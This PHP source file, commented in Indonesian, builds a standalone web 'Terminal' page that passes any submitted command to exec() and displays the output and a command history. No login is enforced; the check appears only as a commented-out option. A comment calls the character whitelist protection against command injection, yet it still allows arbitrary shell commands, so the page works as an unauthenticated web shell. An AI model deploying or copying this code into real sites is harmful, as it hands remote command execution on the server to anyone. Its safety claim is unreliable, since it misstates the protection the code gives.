<?php
/**
 * Contoh "Terminal" terpisah
 * Anda bisa modifikasi lebih lanjut sesuai keinginan.
 */

session_start(); // Agar bisa berbagi $_SESSION, jika diperlukan

// Batasi jumlah riwayat perintah yang disimpan
define('MAX_HISTORY', 50);

// Opsional: periksa apakah sudah login di file manager
//   misalnya cek $_SESSION['logged_in']...

$command_output = '';
if (isset($_POST['cmd_action']) && $_POST['cmd_action'] === 'execute') {
    $cmd = trim($_POST['command']);
    if (!empty($cmd)) {
        // Validasi perintah untuk mencegah command injection
        if (!preg_match('/^[a-zA-Z0-9\s\-_\.\/]+$/', $cmd)) {
            $command_output = "[ERROR] Perintah tidak valid.";
        } else {
            if (!isset($_SESSION['cmd_history'])) {
                $_SESSION['cmd_history'] = [];
            }

            // Batasi riwayat perintah
            if (count($_SESSION['cmd_history']) >= MAX_HISTORY) {
                array_shift($_SESSION['cmd_history']);
            }

            $_SESSION['cmd_history'][] = $cmd;

            $o = [];
            $r = 0;
            @exec($cmd, $o, $r);
            $command_output = ($r === 0 ? implode("\n", $o) : "[ERROR:$r]\n" . implode("\n", $o));
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #1e1e1e;
      color: #fff;
      font-family: sans-serif;
    }
    .container {
      padding: 10px;
    }
    h3 {
      color: #f70;
      margin-top: 0;
    }
    input[type=text] {
      width: 100%;
      background: #333;
      border: 1px solid #444;
      color: #fff;
      border-radius: 4px;
      padding: 6px;
      margin-bottom: 8px;
    }
    input[type=submit] {
      background: #f70;
      color: #111;
      border: none;
      padding: 6px 12px;
      cursor: pointer;
      border-radius: 4px;
      font-weight: bold;
      margin-bottom: 8px;
    }
    input[type=submit]:hover {
      background: #ffa500;
    }
    textarea {
      width: 100%;
      height: 120px;
      background: #000;
      color: #0f0;
      border: 1px solid #f70;
      border-radius: 4px;
      padding: 4px;
      resize: vertical;
      font-family: monospace;
    }
    .history {
      background: #111;
      padding: 6px;
      border: 1px solid #444;
      max-height: 100px;
      overflow: auto;
      margin-bottom: 8px;
    }
    .history li {
      color: #0f0;
      font-family: monospace;
      margin-bottom: 4px;
    }
  </style>
</head>
<body>
<div class="container">
  <h3>Terminal (Terpisah)</h3>
  <?php
  // Tampilkan riwayat
  if (!empty($_SESSION['cmd_history'])) {
      echo "<div style='font-size:0.9em;margin-bottom:6px;'>Riwayat perintah:</div>";
      echo "<ul class='history'>";
      foreach (array_reverse($_SESSION['cmd_history']) as $h) {
          echo "<li>" . htmlspecialchars($h) . "</li>";
      }
      echo "</ul>";
  }
  ?>
  <form method="post">
    <input type="hidden" name="cmd_action" value="execute">
    <input type="text" name="command" placeholder="ls -la atau dir">
    <input type="submit" value="Run">
  </form>
  <textarea readonly><?php echo htmlspecialchars($command_output); ?></textarea>
</div>
</body>
</html>
